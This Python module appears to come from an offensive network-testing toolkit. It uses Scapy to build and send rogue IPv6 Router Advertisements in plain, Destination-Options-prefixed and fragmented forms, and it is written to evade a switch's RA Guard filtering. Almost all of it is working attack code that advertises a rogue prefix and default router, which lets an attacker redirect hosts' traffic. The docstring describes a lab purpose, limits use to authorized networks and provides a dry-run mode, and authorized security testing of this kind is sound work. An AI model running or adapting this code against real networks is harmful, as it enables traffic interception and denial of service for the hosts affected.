"""IPv6 RA Guard evasion: send Router Advertisements in forms a switch's RA Guard may not parse.

RA Guard (RFC 6105) is a switch feature that drops Router Advertisements arriving on untrusted ports. To find
the RA, the filter has to walk the IPv6 extension header chain and handle fragments. A filter that stops at
the first header, or that cannot reassemble a fragment, can miss an RA that a host still processes.

This module builds the same RA as the rogue router advertisement module in three forms:

- plain: the RA as usual. This is the control: a filter that drops it shows it is working at all.
- destination_options: the RA behind a Destination Options header with PadN, so the ICMPv6 type is not the
  first header after IPv6.
- fragmented: the ICMPv6 message split in two IPv6 fragments. The first carries only the first 8 octets
  (type, code, checksum, hop limit, flags, router lifetime), so a filter that inspects a single fragment
  never sees the Prefix Information option.

Whether a given switch drops these forms depends on its implementation, so the module reports what it sent.
The lab checks the host side: whether a Linux host still processes each form and configures from it. RA Guard
on a switch needs the switch under test.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.layers.inet6 import (
    ICMPv6ND_RA,
    ICMPv6NDOptPrefixInfo,
    ICMPv6NDOptSrcLLAddr,
    IPv6,
    IPv6ExtHdrDestOpt,
    IPv6ExtHdrFragment,
    PadN,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import (
    ALL_NODES_IP,
    ALL_NODES_MAC,
    MAX_ROUTER_LIFETIME,
    link_local_from_mac,
    validate_prefix,
)

MAX_FRAMES = 100
VARIANTS = ("plain", "destination_options", "fragmented")
FIRST_FRAGMENT_OCTETS = 8
ICMPV6_NEXT_HEADER = 58
FRAGMENT_NEXT_HEADER = 44
DESTINATION_OPTIONS_NEXT_HEADER = 60


@dataclass(frozen=True)
class RaGuardEvasionConfig:
    iface: str                          # attacker interface, on the segment with the switch
    source_mac: str                     # the advertised router's MAC (required)
    variant: str = "plain"              # one of VARIANTS
    prefix: str = "2001:db8:bad::/64"   # the /64 advertised for SLAAC
    router_lifetime: int = 1800         # seconds this host is a default router
    frames: int = 3                     # times the advertisement is sent, to keep the router entry fresh
    fragment_id: int = 0x4D41           # identification shared by the two fragments
    dry_run: bool = False               # build advertisements but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        validate_prefix(self.prefix)
        if self.variant not in VARIANTS:
            raise ValueError(f"Variant must be one of: {', '.join(VARIANTS)}.")
        if not 1 <= self.router_lifetime <= MAX_ROUTER_LIFETIME:
            raise ValueError(f"Router lifetime must be between 1 and {MAX_ROUTER_LIFETIME} seconds.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class RaGuardEvasionStats:
    frames: int = 0
    status: str = ""


def _ra_message(config: RaGuardEvasionConfig, source: str) -> Packet:
    """The ICMPv6 Router Advertisement, with its options. Its checksum is set once it sits under IPv6."""
    network = validate_prefix(config.prefix)
    return (
        ICMPv6ND_RA(routerlifetime=config.router_lifetime, reachabletime=0, retranstimer=0)
        / ICMPv6NDOptSrcLLAddr(lladdr=source)
        / ICMPv6NDOptPrefixInfo(
            prefixlen=64, L=1, A=1, validlifetime=86400, preferredlifetime=14400,
            prefix=str(network.network_address),
        )
    )


def _ipv6(source: str) -> IPv6:
    return IPv6(src=link_local_from_mac(source), dst=ALL_NODES_IP, hlim=255)


def build_advertisements(config: RaGuardEvasionConfig) -> list[Packet]:
    """The frames for one advertisement in the configured variant (two frames for the fragmented form)."""
    source = normalize_unicast_mac(config.source_mac)
    ether = Ether(src=source, dst=ALL_NODES_MAC)

    if config.variant == "plain":
        return [ether / _ipv6(source) / _ra_message(config, source)]

    if config.variant == "destination_options":
        return [
            ether / _ipv6(source)
            / IPv6ExtHdrDestOpt(options=[PadN(optdata=b"\x00" * 4)])
            / _ra_message(config, source)
        ]

    # fragmented: the complete message gives the checksum; the bytes are then cut in two.
    complete = bytes(_ipv6(source) / _ra_message(config, source))[40:]
    head, tail = complete[:FIRST_FRAGMENT_OCTETS], complete[FIRST_FRAGMENT_OCTETS:]
    first = (
        ether / _ipv6(source)
        / IPv6ExtHdrFragment(nh=ICMPV6_NEXT_HEADER, offset=0, m=1, id=config.fragment_id)
        / Raw(load=head)
    )
    second = (
        ether / _ipv6(source)
        / IPv6ExtHdrFragment(nh=ICMPV6_NEXT_HEADER, offset=FIRST_FRAGMENT_OCTETS // 8, m=0, id=config.fragment_id)
        / Raw(load=tail)
    )
    return [first, second]


def run_ra_guard_evasion(
    config: RaGuardEvasionConfig,
    stop_event: threading.Event,
    on_progress: Callable[[RaGuardEvasionStats], None],
    send: Callable[..., Any] | None = None,
) -> RaGuardEvasionStats:
    """Send the advertisement `frames` times in the configured variant, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = RaGuardEvasionStats(
            status=(
                f"Dry run: would send {config.frames} Router Advertisement(s) for {config.prefix} in the "
                f"'{config.variant}' form. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = RaGuardEvasionStats()
    frames = build_advertisements(config)
    for _ in range(config.frames):
        for frame in frames:
            if stop_event.is_set():
                stats.status = f"Stopped after {stats.frames} frame(s)."
                return stats
            send(frame, iface=config.iface, verbose=False)
            stats.frames += 1
        on_progress(replace(stats))
    return stats
